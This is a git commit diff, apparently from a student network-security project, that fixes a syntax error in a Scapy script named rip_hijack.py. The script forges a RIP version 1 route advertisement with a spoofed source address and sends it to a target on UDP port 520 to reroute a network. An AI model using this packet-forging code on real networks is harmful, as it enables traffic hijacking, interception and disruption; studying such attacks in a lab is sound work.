85f3030d14deaad0c7fe3f03d6b39e230a46d36d
Kevin Nanhekhan <k.r.nanhekhan@student.tudelft.nl>
2022-02-25 21:21:18 +0100

    Update rip_hijack.py

--- network_layer/rip_hijack/rip_hijack.py
+++ network_layer/rip_hijack/rip_hijack.py
@@ -9,7 +9,7 @@ if __name__ == "__main__":
 
 	# Create packet for rerouting ip and send it.
 	network_ip =network_addr.split("/")
-	ip = IP(src=reroute_ip, dst=target_ip)/
+	ip = IP(src=reroute_ip, dst=target_ip)
 	rip = RIP(cmd=2, version=1)/ RIPEntry(addr=network_ip[0], mask="255.255.255.0")
 	pkt = ip/ UDP(dport=520)/ rip
 	send(pkt)
